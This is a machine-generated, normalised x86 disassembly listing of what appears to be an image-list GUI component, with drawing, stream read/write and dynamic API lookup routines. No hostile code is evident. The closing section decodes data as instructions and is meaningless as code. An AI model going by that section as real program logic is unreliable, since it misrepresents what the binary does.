mov ebx eax
mov eax ebx
call sub_4476bc
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_447890
push eax
call ImageList_GetBkColor
call sub_4474d8
pop ebx
retn
sub_447ef8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_4476bc
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_4474b8
push eax
mov eax ebx
call sub_447ed0
call sub_4474b8
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_41dd60
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_447890
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_4224a8
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_41d618
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_412be0
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_4224a8
pop edx
call sub_41d9bc
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_4224a8
call sub_41dd60
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_447890
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_412be0
mov eax [ ebx + 0x54 ]
call sub_4224a8
call sub_41dd60
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_41d618
mov eax edi
call sub_41dd60
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_41d618
mov eax edi
call sub_41dd60
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_421ee0
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_423278
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_4480cc
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ eax + 0x40 ]
push ebx
mov bl [ eax + 0x43 ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
call sub_4480f0
pop ebx
pop ebp
retn 0xc
sub_4480f0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_4476bc
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
xor eax eax
mov al [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_44813c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_412be0
mov eax [ ebp - 0x4 ]
call sub_448dd0
xor eax eax
push ebp
push sub_4482d5
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_421ee0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4482b8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_421ee0
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44829b
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_423278
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4482a2
mov eax [ ebp - 0x10 ]
call sub_403198
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_4224a8
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_41d9bc
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_41dd60
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_4224a8
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_41d9bc
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_41dd60
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4479cc
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_4482e4
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_447890
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_44813c
sub_448304
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov eax ebx
call sub_4478f4
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_414654
mov eax ebx
call sub_447e8c
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_4484ec
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_447890
mov edx eax
mov eax ebx
call sub_447794
mov eax ebx
call sub_4476bc
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_447890
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_4476c4
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_447890
push eax
call ImageList_GetBkColor
call sub_4474d8
mov edx eax
mov eax ebx
call sub_447e98
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_4482e4
jmp r-xdata
sub_4483c4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_414738
pop esi
pop ebx
retn
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_4484ec
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_447e8c
mov eax esi
call sub_447890
mov edx eax
mov eax ebx
call sub_447794
mov eax ebx
call sub_4476bc
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_447890
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_4476c4
jmp r-xdata
mov eax esi
call sub_447890
push eax
call ImageList_GetBkColor
call sub_4474d8
mov edx eax
mov eax ebx
call sub_447e98
mov edx esi
mov eax ebx
call sub_4482e4
pop esi
pop ebx
retn
sub_448474
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4484e0
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4484e7
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_448514
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_414098
mov si 0xffff
call sub_403394
inc ebp
dec edi
jne r-xdata
sub_448564
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413f38
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_414098
cmp ebp eax
jne r-xdata
sub_4485bc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_407c90
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_448600
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_447bb4
mov ebx eax
mov eax edi
call sub_447bb4
cmp ebx eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_447bb4
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4486dc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4486bf
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4485bc
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4486c6
mov eax [ ebp - 0xc ]
call sub_403198
retn
mov eax edi
call sub_447bb4
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_4486f0
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_447bb4
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_448600
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_44874c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_419dc8
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_4486f0
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4487a4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_415f1c
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_415f1c
mov dl 0x1
mov eax [ r-xdata ]
call sub_421ee0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_448a28
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_415cf0
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_415d10
mov dl 0x1
mov eax [ r-xdata ]
call sub_421ee0
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_448a0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_421ee0
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_421ee0
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_423278
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_412be0
mov eax [ ebp - 0x4 ]
call sub_448dd0
xor eax eax
push ebp
push sub_4489ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4489f5
mov eax [ ebp - 0xc ]
call sub_403198
mov eax [ ebp - 0x14 ]
call sub_403198
mov eax [ ebp - 0x4 ]
call sub_448dd4
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_412c08
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4224a8
push eax
mov eax [ ebp - 0xc ]
call sub_4224a8
lea edx [ ebp - 0x30 ]
pop ecx
call sub_41d888
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_412c08
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4224a8
push eax
mov eax [ ebp - 0x14 ]
call sub_4224a8
lea edx [ ebp - 0x30 ]
pop ecx
call sub_41d888
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4479cc
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_448a38
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a548
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_448a98
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_447854
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448a9f
mov eax [ ebp - 0xc ]
call sub_403198
retn
sub eax 0xffffffec
sub_448a9f
mov eax [ ebp - 0x4 ]
call sub_4476bc
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_448bce
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_415d10
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_416418
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_415d10
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403198
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_415d10
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a548
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_448bb1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_415d10
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_447854
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403198
retn
sub eax 0xffffffec
mov al [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_415d10
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_448c00
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_4478f4
mov eax edi
call sub_415cf0
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov bl [ esp ]
and bl 0xff
mov ax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_415d10
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_4487a4
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_448a38
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_448c8c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a548
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_448d86
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_40c218
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_447890
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_447890
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448d8d
mov eax [ ebp - 0x4 ]
call sub_403198
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_403924
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_403924
jmp r-xdata
sub_448df4
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403188
test bl bl
jle r-xdata
mov edx esi
call sub_448564
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_448e40
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_448e65
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448e6c
retn
sub_4492d8
inc esp
add al bh
lds eax [ eax + eax + 0x9 ]
push esp
dec ebp
outsb
jne r-xdata
test al 0x0
add bh bh
test al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
push es
add [ esi ] al
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x448ed070
add [ eax ] cl
add bh bh
cld
lds eax [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ebx
push 0xbc6b6365
nop
inc esp
add [ ebx ] bh
add [ eax ] al
[ eax + ebx * 8 ]
arpl [ ebx - 0x44 ] bp
insd
in al dx
xchg edx eax
inc esp
add [ edi ] al
or [ ebp + ecx * 2 + 0x65 ] edx
outsb
jne r-xdata
add [ eax ] al
call eax
mov [ eax + eax + 0x20 ] 0xcf
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
imul ebp [ edi + 0x6e ] r-xdata
cmp [ eax ] al
add bh bh
jl r-xdata
add eax [ eax ]
or [ ecx + 0x75 ] eax
je r-xdata
add [ eax ] 0x0
add [ eax ] al
je r-xdata
adc [ eax ] al
cmp eax 0x70ff0000
int 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x61 ] edx
imul ebp [ fs : edi + 0x49 ] 0xf06d6574
push ss
inc ecx
add [ eax ] ah
add bh bh
fadd st7
inc esp
add [ eax + 0x44cf ] ah
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
dec ecx
outsb
js r-xdata
pop es
add [ 0x61657242 ] al
add [ eax ] al
inc esp
add [ eax ] al
iretd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
insd
push eax
xchg edx eax
inc esp
add ah bl
sub [ ecx ] eax
sbb [ eax ] al
add eax 0x756e654d
jae r-xdata
cwde
inc ebx
jne r-xdata
add bh bh
push ss
inc ecx
add [ eax + eax ] dl
call [ eax + eax ]
jmp [ eax - 0x31 ]
inc edx
jb r-xdata
dec eax
outsd
je r-xdata
add [ eax ] al
add [ edx ] 0x0
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp + 0x41 ] ch
add [ edi + eax * 8 - 0x33d7ffbc ] cl
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41060002 ] al
inc ecx
add al al
mov eax [ 0x33ec0041 ]
inc eax
add [ ebx + ebx * 4 ] dl
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
outsb
jne r-xdata
imul esp [ eax + edx + 0x300040 ] 0x0
dec [ esi + eax * 8 ]
popad
jns r-xdata
add [ eax - 0x1d ] dh
inc ecx
add ah dh
xor eax [ eax ]
adc al 0x9b
ja r-xdata
push esp
adc [ eax ] al
aas
add [ eax ] al
dec [ eax - 0x39 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x72470a00
outsd
jne r-xdata
insd
popad
jae r-xdata
inc esp
add al ah
into
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070008 ] al
popad
jo r-xdata
add bh bh
or al 0xc6
mov esp 0x3c004490
add [ eax ] al
[ eax + 0x10044d9 ]
outsb
